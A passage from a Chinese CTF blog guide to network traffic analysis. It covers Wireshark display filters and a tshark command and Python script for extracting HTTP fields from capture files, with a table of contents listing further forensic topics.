<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=2"><meta name=robots content="noodp"><title>Misc-流量分析 - ⚡Lunatic BLOG⚡</title><meta name=author content="Lunatic"><meta name=description content="CTF-Misc 入门指南——流量分析系列
"><meta name=keywords content='CTF,Misc'><meta itemprop=name content="Misc-流量分析"><meta itemprop=description content="CTF-Misc 入门指南——流量分析系列"><meta itemprop=datePublished content="2025-05-15T10:15:27+08:00"><meta itemprop=dateModified content="2025-05-15T10:15:27+08:00"><meta itemprop=wordCount content="10755"><meta itemprop=keywords content="CTF,Misc"><meta property="og:url" content="https://goodlunatic.github.io/posts/5422d65/"><meta property="og:site_name" content="⚡Lunatic BLOG⚡"><meta property="og:title" content="Misc-流量分析"><meta property="og:description" content="CTF-Misc 入门指南——流量分析系列"><meta property="og:locale" content="zh_CN"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-05-15T10:15:27+08:00"><meta property="article:modified_time" content="2025-05-15T10:15:27+08:00"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Misc"><meta name=twitter:card content="summary"><meta name=twitter:title content="Misc-流量分析"><meta name=twitter:description content="CTF-Misc 入门指南——流量分析系列"><meta name=application-name content="FixIt"><meta name=apple-mobile-web-app-title content="FixIt"><meta name=theme-color data-light=#f8f8f8 data-dark=#252627 content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel=icon href=https://www.nssctf.cn/files/2024/4/28/7f130a1387.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical type=text/html href=https://goodlunatic.github.io/posts/5422d65/ title="Misc-流量分析 - ⚡Lunatic BLOG⚡"><link rel=prev type=text/html href=https://goodlunatic.github.io/posts/32c3b27/ title="DASCTF 2024最后一战 Misc Writeup"><link rel=next type=text/html href=https://goodlunatic.github.io/posts/ca974cb/ title="Frida Learning Record"><link rel=alternate type=text/markdown href=https://goodlunatic.github.io/posts/5422d65/index.md title="Misc-流量分析 - ⚡Lunatic BLOG⚡"><link rel=stylesheet href=/css/config.min.css><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Misc-流量分析","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/goodlunatic.github.io\/posts\/5422d65\/"},"image":["https:\/\/www.nssctf.cn\/files\/2025\/8\/21\/8ce6223a1a.png"],"genre":"posts","keywords":"CTF, Misc","wordcount":10755,"url":"https:\/\/goodlunatic.github.io\/posts\/5422d65\/","datePublished":"2025-05-15T10:15:27+08:00","dateModified":"2025-05-15T10:15:27+08:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Lunatic"},"description":""}</script><script src=/js/head/color-scheme.min.js></script></head><body data-header-desktop=sticky data-header-mobile=auto><div class=wrapper data-page-style=normal><header class="desktop animate__faster" id=header-desktop><div class=header-wrapper data-github-corner=left><div class=header-title><a href=/ title="⚡Lunatic BLOG⚡"><span class=header-title-text>⚡Lunatic BLOG⚡</span></a><span class=header-subtitle></span></div><nav><ul class=menu><li class=menu-item><a class=menu-link href=/collections/><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden=true></i> 合集</a></li><li class=menu-item><a class=menu-link href=/archives/><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden=true></i> 归档</a></li><li class=menu-item><a class=menu-link href=/categories/><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden=true></i> 分类</a></li><li class=menu-item><a class=menu-link href=/tags/><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden=true></i> 标签</a></li><li class=menu-item><a class=menu-link href=/friends/><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden=true></i> 友链</a></li><li class=menu-item><a class=menu-link href=/about/><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden=true></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id=search-desktop><input type=text placeholder=搜索文章标题或内容…… id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fa-solid fa-search fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i>
</a><span class="search-button search-loading" id=search-loading-desktop><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></li><li class="menu-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></li></ul></nav></div></header><header class="mobile animate__faster" id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="⚡Lunatic BLOG⚡"><span class=header-title-text>⚡Lunatic BLOG⚡</span></a><span class=header-subtitle></span></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><nav><ul class=menu id=menu-mobile><li class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容…… id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fa-solid fa-search fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i>
</a><span class="search-button search-loading" id=search-loading-mobile><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></li><li class=menu-item><a class=menu-link href=/collections/><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden=true></i> 合集</a></li><li class=menu-item><a class=menu-link href=/archives/><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden=true></i> 归档</a></li><li class=menu-item><a class=menu-link href=/categories/><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden=true></i> 分类</a></li><li class=menu-item><a class=menu-link href=/tags/><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden=true></i> 标签</a></li><li class=menu-item><a class=menu-link href=/friends/><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden=true></i> 友链</a></li><li class=menu-item><a class=menu-link href=/about/><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden=true></i> 关于</a></li><li class="menu-item menu-system"><span class="menu-system-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></span></li></ul></nav></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=fi-container><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label=合集><div class="details collection-details open"><div class="details-summary collection-summary"><i class="fa-solid fa-layer-group fa-fw" aria-hidden=true></i>
<span class=collection-name title=合集>CTF-Misc入门指南</span>
<span class=collection-count>8</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class="details-content collection-content"><nav><ul class=collection-list><li class=collection-item><a href=/posts/1ad9200/ title="[持续更新] CTF-Misc Guide">[持续更新] CTF-Misc Guide</a></li><li class=collection-item><a href=/posts/c5bc8a2/ title=Misc-AI安全>Misc-AI安全</a></li><li class=collection-item><a href=/posts/761da51/ title=Misc-数字取证>Misc-数字取证</a></li><li class=collection-item><span class=active title=Misc-流量分析>Misc-流量分析</span></li><li class=collection-item><a href=/posts/c49ae8a/ title=Misc-数据安全>Misc-数据安全</a></li><li class=collection-item><a href=/posts/01ebd40/ title=Misc-工控安全>Misc-工控安全</a></li><li class=collection-item><a href=/posts/442fd1d/ title=Misc-沙箱逃逸>Misc-沙箱逃逸</a></li><li class=collection-item><a href=/posts/3e9e231/ title=Misc-区块链安全>Misc-区块链安全</a></li></ul><div class=collection-nav-simple><a href=/posts/761da51/ class=collection-nav-item rel=prev title=Misc-数字取证><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i></a><span class=text-secondary>4/8</span><a href=/posts/c49ae8a/ class=collection-nav-item rel=next title=Misc-数据安全><i class="fa-solid fa-angle-right fa-fw" aria-hidden=true></i></a></div></nav></div></div><div class="details related-details open"><div class="details-summary related-summary"><i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden=true></i>
<span class=related-title>相关内容</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class="details-content related-content"><ul class=related-list><li class=related-item><a href=/posts/01ebd40/ title=Misc-工控安全>Misc-工控安全</a></li><li class=related-item><a href=/posts/32c3b27/ title="DASCTF 2024最后一战 Misc Writeup">DASCTF 2024最后一战 Misc Writeup</a></li><li class=related-item><a href=/posts/87bd986/ title="2025 能源网络安全大赛 Misc Writeup">2025 能源网络安全大赛 Misc Writeup</a></li><li class=related-item><a href=/posts/e9c4fc7/ title="2025 UCSCCTF Misc Writeup">2025 UCSCCTF Misc Writeup</a></li><li class=related-item><a href=/posts/c49ae8a/ title=Misc-数据安全>Misc-数据安全</a></li></ul></div></div><div class=aside-custom><a href target=_blank rel=external><img src=/images/zsxq.webp alt="Lunatic Planet QR code" width=100%></a></div></aside><article class="page single"><div class=header><h1 class="single-title animate__animated animate__flipInX"><span>Misc-流量分析</span></h1></div><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://goodlunatic.github.io title=作者 target=_blank rel="external nofollow noopener noreferrer author" class=author><img class=avatar src=https://www.nssctf.cn/files/2024/4/28/7f130a1387.png alt=Lunatic height=16 width=16>&nbsp;Lunatic</a></span><span class=post-included-in>&nbsp;收录于 <a href=/categories/ctf/ class=post-category title="分类 - CTF"><i class="fa-regular fa-folder fa-fw" aria-hidden=true></i> CTF</a> 和 <a href=/collections/ctf-misc%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/ class=post-collection title="合集 - CTF-Misc入门指南"><i class="fa-solid fa-layer-group fa-fw" aria-hidden=true></i> CTF-Misc入门指南</a></span></div><div class=post-meta-line><span title="发布于 2025-05-15 10:15:27"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden=true></i><time datetime=2025-05-15>2025-05-15</time></span>&nbsp;<span title="10755 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden=true></i>约 10800 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden=true></i>预计阅读 51 分钟</span>&nbsp;<span id=busuanzi_container_page_pv class="busuanzi_visitors comment-visitors" data-flag-title=Misc-流量分析><i class="fa-regular fa-eye fa-fw me-1" aria-hidden=true></i><span id=busuanzi_value_page_pv>-</span>&nbsp;次阅读
</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept=false><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fa-solid fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#wireshark基础>WireShark基础</a></li><li><a href=#tshark使用教程>tshark使用教程</a></li><li><a href=#流量分析基础考点>流量分析基础考点</a><ul><li><a href=#1直接搜索flag明文或者编码过的flag>1、直接搜索flag明文或者编码过的flag:</a></li><li><a href=#2流量包端口隐写可能会有01互换>2、流量包端口隐写（可能会有01互换）</a></li><li><a href=#3tcpftp协议传输文件binwalk和foremost都没用>3、TCP/FTP协议传输文件(binwalk和foremost都没用)：</a></li><li><a href=#4有时候可能需要根据ip或者版本分类导出>4、有时候可能需要根据IP或者版本分类导出</a></li></ul></li><li><a href=#usb流量分析>USB流量分析</a><ul><li><a href=#键盘流量分析>键盘流量分析</a></li><li><a href=#鼠标流量分析>鼠标流量分析</a></li><li><a href=#数位板流量分析>数位板流量分析</a></li><li><a href=#xbox手柄流量分析>xbox手柄流量分析</a></li></ul></li><li><a href=#sql注入流量分析>SQL注入流量分析</a></li><li><a href=#webshell流量分析>Webshell流量分析</a><ul><li><a href=#菜刀流量分析>菜刀流量分析</a></li><li><a href=#哥斯拉流量分析>哥斯拉流量分析</a><ul><li><a href=#php_xor_raw>php_xor_raw</a></li><li><a href=#php_xor_base64>php_xor_base64</a></li><li><a href=#php_eval_xor_base64>php_eval_xor_base64</a></li></ul></li><li><a href=#冰蝎流量分析>冰蝎流量分析</a><ul><li><a href=#xor_base64>XOR_base64</a></li><li><a href=#aes_base64>AES_base64</a></li></ul></li><li><a href=#蚁剑流量分析>蚁剑流量分析</a><ul><li><a href=#reverse>Reverse</a></li><li><a href=#rot13>ROT13</a></li><li><a href=#rsa>RSA</a></li></ul></li><li><a href=#cobalstrike流量分析>CobalStrike流量分析</a><ul><li><a href=#密钥对文件的情况>密钥对文件的情况</a></li><li><a href=#给beacon的情况>给Beacon的情况</a></li></ul></li></ul></li><li><a href=#ntlm认证流量分析>NTLM认证流量分析</a><ul><li><a href=#ntlm认证的基本概念>NTLM认证的基本概念</a><ul><li><a href=#ntlm-协议概述>NTLM 协议概述：</a></li><li><a href=#ntlm-认证的完整流程>NTLM 认证的完整流程：</a></li><li><a href=#net-ntlm-hash-与响应类型>Net-NTLM Hash 与响应类型</a></li><li><a href=#net-ntlm-hash-的格式>Net-NTLM Hash 的格式</a></li><li><a href=#net-ntlm-hash-的生成流程>Net-NTLM Hash 的生成流程</a></li><li><a href=#lmcompatibilitylevellan-管理器身份验证级别>LmCompatibilityLevel（LAN 管理器身份验证级别）</a></li></ul></li><li><a href=#ntlmv2-认证的smb流量>NTLMv2 认证的SMB流量</a></li><li><a href=#ntlmv2-认证的http流量>NTLMv2 认证的HTTP流量</a></li><li><a href=#ntlmv2-认证的stmp流量>NTLMv2 认证的STMP流量</a></li></ul></li><li><a href=#kerberos认证流量分析>kerberos认证流量分析</a><ul><li><a href=#kerberos认证的基本概念>kerberos认证的基本概念</a></li><li><a href=#kerberos认证的完整流程>kerberos认证的完整流程</a></li><li><a href=#解密kerberos认证加密的流量>解密Kerberos认证加密的流量</a></li></ul></li><li><a href=#ad域流量分析>AD域流量分析</a><ul><li><a href=#dcerpc-协议>DCE/RPC 协议</a></li></ul></li><li><a href=#rtp流量分析>RTP流量分析</a></li><li><a href=#工控流量分析>工控流量分析</a><ul><li><a href=#modbus-协议分析>Modbus 协议分析</a><ul><li><a href=#例题1-hngk-modbus流量分析>例题1 HNGK-Modbus流量分析</a></li></ul></li><li><a href=#s7comm-协议分析>S7comm 协议分析</a><ul><li><a href=#例题1-2020icsc湖州站工控协议数据分析>例题1 2020ICSC湖州站—工控协议数据分析</a></li><li><a href=#例题2-2020icsc济南站被篡改的数据>例题2 2020ICSC济南站—被篡改的数据</a></li><li><a href=#例题3-枢网智盾2021异常流分析>例题3 枢网智盾2021—异常流分析</a></li><li><a href=#例题4-枢网智盾2021工控协议分析>例题4 枢网智盾2021—工控协议分析</a></li></ul></li><li><a href=#iec60870_asdu协议>IEC60870_ASDU协议</a></li><li><a href=#tpkt协议>TPKT协议</a></li><li><a href=#dnp-30协议>DNP 3.0协议</a></li></ul></li><li><a href=#蓝牙流量分析>蓝牙流量分析</a><ul><li><a href=#obex协议>OBEX协议</a></li><li><a href=#att协议>ATT协议</a></li><li><a href=#smp协议>SMP协议</a></li></ul></li><li><a href=#邮件流量分析>邮件流量分析</a></li><li><a href=#无线流量分析>无线流量分析</a></li><li><a href=#dns流量分析>DNS流量分析</a><ul><li><a href=#dnslog外带的流量>DNSlog外带的流量</a></li><li><a href=#数据以二进制藏在dns各种解析记录中>数据以二进制藏在DNS各种解析记录中</a></li><li><a href=#信息以二进制藏在端口号末尾中>信息以二进制藏在端口号末尾中</a></li></ul></li><li><a href=#slltls加密流量分析>SLL、TLS加密流量分析</a></li><li><a href=#icmp流量分析>ICMP流量分析</a></li><li><a href=#vpn流量分析>VPN流量分析</a><ul><li><a href=#shadowsocks流量分析>Shadowsocks流量分析</a></li><li><a href=#vmessv2ray流量分析>VMess(V2ray)流量分析</a><ul><li><a href=#vmessmd5>VMessMD5</a></li><li><a href=#vmessaead>VMessAEAD</a></li></ul></li></ul></li><li><a href=#ads-b流量分析>ADS-B流量分析</a></li><li><a href=#oicq协议qq协议>OICQ协议(QQ协议)</a></li><li><a href=#损坏的流量包分析>损坏的流量包分析</a></li><li><a href=#从流量包中找异常流量>从流量包中找异常流量</a></li></ul></nav></div></div><div class=content id=content><p><strong>CTF-Misc 入门指南——流量分析系列</strong></p><p>拿到流量包后，第一件事就是可以先 <code>strings | grep flag{</code> 一下，说不定 flag 就直接出了</p><p>当然也可以使用<code>@凤二西</code>师傅的 <code>破空_flag查找工具3.5.exe</code> 来搜索 flag</p><h2 class=heading-element id=wireshark基础><span>WireShark基础</span>
<a href=#wireshark%e5%9f%ba%e7%a1%80 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>刚刚接触流量分析的同学，看到<code>Wireshark</code>中密密麻麻的流量包和字段可能会感觉无从下手</p><p>但是其实我们要明白一点就是，流量分析的第一步就是过滤，把流量包过滤到我们能掌控的范围内，然后再逐个分析</p><p><code>wireshark</code>的过滤器其实上手很简单，用熟悉了以后会给人一种非常顺手的感觉</p><p>常见的协议比如<code>http</code>，常用的有下面这些参数，其实只要在过滤器中输入<code>htt</code>. 它就会自动提示你后面的字段了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http.request.method == &#34;POST&#34;
</span></span><span class=line><span class=cl>http.request.full_uri == “XXX”
</span></span><span class=line><span class=cl>......</span></span></code></pre></td></tr></table></div></div><p>除了协议以外，还有一些比较常用的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 包含什么内容的帧</span>
</span></span><span class=line><span class=cl>frame contains <span class=s2>&#34;XXX&#34;</span></span></span></code></pre></td></tr></table></div></div><p>其实这里可以直接右击想要过滤的字段，然后作为过滤器选中，上面就会自己跳出来过滤的表达式了（这里也可以使用或选中和且选中）</p><p>有了这个表达式，就可以带入下面的 tshark 命令一键提取所有过滤出来的帧的指定字段的数据了</p><p><img loading=lazy src=/posts/5422d65/imgs/N1.png alt=/posts/5422d65/imgs/N1.png height=1597 width=2557></p><h2 class=heading-element id=tshark使用教程><span>tshark使用教程</span>
<a href=#tshark%e4%bd%bf%e7%94%a8%e6%95%99%e7%a8%8b class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>导出流量包中所有POST数据包的data数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tshark -r 1.pcapng -Y <span class=s2>&#34;http.request.method == POST&#34;</span> -T fields -e data.data &gt; data.txt
</span></span><span class=line><span class=cl><span class=c1># -r：指定了需要读取的文件</span>
</span></span><span class=line><span class=cl><span class=c1># -Y：使用过滤器</span>
</span></span><span class=line><span class=cl><span class=c1># -T：表示仅仅输出所选字段</span>
</span></span><span class=line><span class=cl><span class=c1># -e：指定提取的字段</span></span></span></code></pre></td></tr></table></div></div><p>以下两个命令是Linux中的命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># uinq：去除重复行</span>
</span></span><span class=line><span class=cl><span class=c1># sed &#39;/^\s*$/d&#39;：在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，d 表示删除）</span></span></span></code></pre></td></tr></table></div></div><p>在我们清楚了tshark的相关命令后，我们就可以尝试编写Python脚本来调用tshark进行流量包的处理了</p><p>这种用法通常在我们分析较大流量包并且需要频繁复制里面的数据的时候比较实用</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>output</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>file_path</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span> <span class=c1># 流量包的路径</span>
</span></span><span class=line><span class=cl><span class=n>command</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>	<span class=s2>&#34;tshark&#34;</span><span class=p>,</span>  <span class=c1># tshark的路径，如果在环境变量里这里就不用改</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-r&#39;</span><span class=p>,</span> <span class=n>file_path</span><span class=p>,</span>  <span class=c1># 读取指定的 pcapng 文件</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-Y&#39;</span><span class=p>,</span> <span class=s1>&#39;http&#39;</span><span class=p>,</span>  <span class=c1># 过滤出 HTTP 数据包</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-T&#39;</span><span class=p>,</span> <span class=s1>&#39;json&#39;</span><span class=p>,</span>  <span class=c1># 输出为 JSON 格式</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.request.method&#39;</span><span class=p>,</span>  <span class=c1># 请求方法</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.host&#39;</span><span class=p>,</span>  <span class=c1># 请求主机</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.request.uri&#39;</span><span class=p>,</span>  <span class=c1># 请求 URI</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.user_agent&#39;</span><span class=p>,</span>  <span class=c1># 用户代理</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.file_data&#39;</span><span class=p>,</span>  <span class=c1># 请求中的文件数据（POST 请求的内容）</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.response.code&#39;</span><span class=p>,</span>  <span class=c1># 响应代码</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.response.phrase&#39;</span><span class=p>,</span>  <span class=c1># 响应短语</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.content_type&#39;</span>  <span class=c1># 响应内容类型</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>result</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=n>command</span><span class=p>,</span> <span class=n>check</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span> <span class=n>stderr</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span> <span class=n>text</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>json_output</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>result</span><span class=o>.</span><span class=n>stdout</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># print(json.dumps(json_output, indent=4))  # 这个输出是用来调试的，可以移除</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 遍历 JSON 数据并提取字段</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>packet</span> <span class=ow>in</span> <span class=n>json_output</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>layers</span> <span class=o>=</span> <span class=n>packet</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;_source&#39;</span><span class=p>,</span> <span class=p>{})</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;layers&#39;</span><span class=p>,</span> <span class=p>{})</span>
</span></span><span class=line><span class=cl>    <span class=n>request_method</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.request.method&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>request_host</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.host&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>request_uri</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.request.uri&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>user_agent</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.user_agent&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>file_data</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.file_data&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>response_code</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.response.code&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
